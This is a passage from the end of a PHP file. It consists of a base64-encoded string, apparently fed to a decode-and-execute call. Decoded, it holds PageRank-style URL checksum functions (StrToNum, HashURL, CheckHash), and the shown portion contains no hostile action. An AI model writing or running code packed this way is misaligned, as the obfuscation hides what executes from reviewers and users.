gkQ2hlY2sgLSAkSW50MzJVbml0ICogKGludCkgKCRDaGVjayAvICRJbnQzMlVuaXQpKTsNCiAgICAgICAgICAgICAgICAkQ2hlY2sgPSAoJENoZWNrIDwgLTIxNDc0ODM2NDgpID8gKCRDaGVjayArICRJbnQzMlVuaXQpIDogJENoZWNrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJENoZWNrICs9IG9yZCgkU3RyeyRpfSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRDaGVjazsNCiAgICB9DQoNCiAgICBwcml2YXRlIGZ1bmN0aW9uIEhhc2hVUkwoJFN0cmluZykgew0KICAgICAgICAkQ2hlY2sxID0gJHRoaXMtPlN0clRvTnVtKCRTdHJpbmcsIDB4MTUwNSwgMHgyMSk7DQogICAgICAgICRDaGVjazIgPSAkdGhpcy0+U3RyVG9OdW0oJFN0cmluZywgMCwgMHgxMDAzRik7DQogICAgICAgICRDaGVjazEgPj49IDI7DQogICAgICAgICRDaGVjazEgPSAoKCRDaGVjazEgPj4gNCkgJiAweDNGRkZGQzAgKSB8ICgkQ2hlY2sxICYgMHgzRik7DQogICAgICAgICRDaGVjazEgPSAoKCRDaGVjazEgPj4gNCkgJiAweDNGRkMwMCApIHwgKCRDaGVjazEgJiAweDNGRik7DQogICAgICAgICRDaGVjazEgPSAoKCRDaGVjazEgPj4gNCkgJiAweDNDMDAwICkgfCAoJENoZWNrMSAmIDB4M0ZGRik7DQogICAgICAgICRUMSA9ICgoKCgkQ2hlY2sxICYgMHgzQzApIDw8IDQpIHwgKCRDaGVjazEgJiAweDNDKSkgPDwgMiApIHwgKCRDaGVjazIgJiAweEYwRiApOw0KICAgICAgICAkVDIgPSAoKCgoJENoZWNrMSAmIDB4RkZGRkMwMDApIDw8IDQpIHwgKCRDaGVjazEgJiAweDNDMDApKSA8PCAweEEpIHwgKCRDaGVjazIgJiAweEYwRjAwMDAgKTsNCiAgICAgICAgcmV0dXJuICgkVDEgfCAkVDIpOw0KICAgIH0NCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gQ2hlY2tIYXNoKCRIYXNobnVtKSB7DQogICAgICAgICRDaGVja0J5dGUgPSAwOw0KICAgICAgICAkRmxhZyA9IDA7DQogICAgICAgICRIYXNoU3RyID0gc3ByaW50ZignJXUnLCAkSGFzaG51bSk7DQogICAgICAgICRsZW5ndGggPSBzdHJsZW4oJEhhc2hTdHIpOw0KICAgICAgICBmb3IgKCRpID0gJGxlbmd0aCAtIDE7ICRpID49IDA7ICRpLS0pIHsNCiAgICAgICAgICAgICRSZSA9ICRIYXNoU3RyeyRpfTsNCiAgICAgICAgICAgIGlmICgxID09PSAoJEZsYWcgJSAyKSkgew0KICAgICAgICAgICAgICAgICRSZSArPSAkUmU7DQogICAgICAgICAgICAgICAgJFJlID0gKGludCkgKCRSZSAvIDEwKSArICgkUmUgJSAxMCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkQ2hlY2tCeXRlICs9ICRSZTsNCiAgICAgICAgICAgICRGbGFnKys7DQogICAgICAgIH0NCiAgICAgICAgJENoZWNrQnl0ZSAlPSAxMDsNCiAgICAgICAgaWYgKDAgIT09ICRDaGVja0J5dGUpIHsNCiAgICAgICAgICAgICRDaGVja0J5dGUgPSAxMCAtICRDaGVja0J5dGU7DQogICAgICAgICAgICBpZiAoMSA9PT0gKCRGbGFnICUgMikpIHsNCiAgICAgICAgICAgICAgICBpZiAoMSA9PT0gKCRDaGVja0J5dGUgJSAyKSkgew0KICAgICAgICAgICAgICAgICAgICAkQ2hlY2tCeXRlICs9IDk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRDaGVja0J5dGUgPj49IDE7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICc3JyAuICRDaGVja0J5dGUgLiAkSGFzaFN0cjsNCiAgICB9DQoNCn0='));
?>